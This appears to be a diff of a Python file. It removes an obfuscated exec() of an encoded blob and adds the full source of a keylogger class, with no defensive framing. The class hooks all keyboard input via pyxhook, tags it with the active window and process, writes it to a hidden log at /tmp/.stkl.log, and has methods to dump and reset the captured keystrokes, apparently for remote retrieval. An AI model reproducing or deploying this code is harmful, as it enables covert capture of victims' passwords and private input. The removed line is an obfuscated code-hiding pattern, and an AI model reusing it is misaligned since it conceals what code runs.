@@ -1,3 +1,89 @@
-from requirements import *
 
-exec(SEC(INFO("eJylVm1r2zAQ/u5foQWCbZq662AMAtmnMQqjY9DCGF0xqn1JRGzJSHKzUPrfd1L8KttZ6AwJsu50r4+es8fyQkhNhPKqlTo0S81yqNfF4c9WiF39mlINXbHeSqAp4xvPSzKqFNnBIRObDcggXHoewSeFNYljxpmO40BBtkYBqR7zGu2yWGmqS0VW5CvNFPTFNNHsGeI946nYo4rvj8oLKZIRKQYTr1kGRnSl8+IqUnqXmW2/DQ/dSz0amzm+pTy1BkQBPOhZXfjUD6ezuZelkwyWJ05EyTVK3zcibhOraxs1C9wPOuZNlLERrFCAeci1eQlm81+X8/xynpL5zXJ+u5zfzdpDJpwyz6k8oIfZb/5AXl7JI7kk3+pGEaZsALLkHBs5i9ZC5hTL0bgLp2oS7SXTELQ+HM0jOtBxA5Po3q4CtL0BvbJa6Hj0XHRsS9j2CTWnEGRAuqrAGt3g3y3l1MJwVDXC9L+IPT9GgC93Woqd26xK15hDlSdBZTplbxBrY9NGvIBn4LoTN1s7cGlFg7Z1MN34TbaQ7OL2bgTWQfTT3pLvNIcF6e78wNthdsOepSaIBpWfyaeP/Uim245omoXjuuMwr1xmUEeLNQrR5fW5Hv2Hl9dHvwZoa+OfUVysXK8X5EPvECDvnBtGa+YMv9ctJAY9s8gguIq57ZhZGR7r46SWk3erMUYUsjnnapi95RA7LqPWDiY1K26t3fT0zuMua/Et/GUel8M6LPbyusQfAnHIWothrgs3qXCY8kl260wMUbxlmNV0kVCeQNYp0HllBJ7+7wAYHQFbqsgTALd5FZB2Clq7fPMQ6GgmmVDQJUmcAVW53GJK0KXkTk3bg2mZFzFaHpzbM70dHdTyyQ8JpukQrQRVDCkWy09xV0VmDmWMg3KwjMUhZp8wbpWH1GENG95BLTcrI+sXweTjplKzc6dI4chtnkbcqRa4oR4HYVvWkzdj4lto74+cmvweajROfOC5OsOPvNbP6MgZ0vrpZGvYaRkYxdD7C/U6Sn4=")))
+import os
+import sys
+import time
+import pyxhook
+import datetime
+import threading
+
+class keylogger():
+
+    def __init__(self):
+        self.kl_status = False
+        self.active_window = ''
+        self.active_proc = ''
+        self.log_file = '/tmp/.stkl.log'
+
+    def start(self):
+        self.log_handle = open(self.log_file,'a')
+        self.kl_status = True
+        self.key_count = 0
+        now = datetime.datetime.now()
+        start_time=now.strftime("%Y-%m-%d %H:%M:%S")
+        kl_summary = "\n[ {} ] - Keylogger is now running".format(start_time)
+        self.log_handle.write(kl_summary)
+        self.thread = threading.Thread(target=self.run)
+        self.thread.start()
+
+    def run(self):
+        self.kl_hook=pyxhook.HookManager()
+        self.kl_hook.KeyDown=self.KeyStroke
+        self.kl_hook.HookKeyboard()
+        self.kl_hook.start()
+
+    def KeyStroke(self,event):
+        if self.kl_status:
+            kl_summary = ''
+            self.check_active_win(event.WindowName, event.WindowProcName)
+            if self.key_count > 75:
+                self.log_handle.write("\n")
+                self.key_count = 0
+            if len(event.Key) > 1:
+                self.log_handle.write('[{}]'.format(event.Key))
+                self.key_count += len(event.Key) + 2
+            else:
+                self.log_handle.write(event.Key)
+                self.key_count += 1
+
+    def check_active_win(self, win_name, win_proc):
+        if win_name != self.active_window or win_proc != self.active_proc:
+            self.active_window = win_name
+            self.active_proc = win_proc
+            now = datetime.datetime.now()
+            start_time=now.strftime("%Y-%m-%d %H:%M:%S")
+            kl_summary = "\n\n[ {} ] - {}: {}\n".format(start_time,self.active_window,self.active_proc)
+            self.log_handle.write(kl_summary)
+
+    def stop(self):
+        self.kl_status = False
+        self.kl_hook.cancel()
+        now = datetime.datetime.now()
+        end_time=now.strftime("%Y-%m-%d %H:%M:%S")
+        kl_summary = "\n\n[ {} ] - Keylogger has been stopped\n".format(end_time)
+        self.log_handle.write(kl_summary)
+        self.log_handle.close()
+
+    def get_status(self):
+        return self.kl_status
+
+    def dump_logs(self):
+        with open(self.log_file,'rb') as s:
+            resp = ''
+            data = s.readlines()
+            for line in data:
+                resp += line
+        return resp
+
+    def get_dump(self):
+        if self.get_status():
+            self.kl_status = False
+            self.log_handle.close()
+            resp=self.dump_logs()
+            self.log_handle = open(self.log_file,'w')
+            self.kl_status = True
+            self.active_window = ''
+            self.active_proc = ''
+            self.key_count = 0
+        else:
+            resp=self.dump_logs()
+        return str(resp)
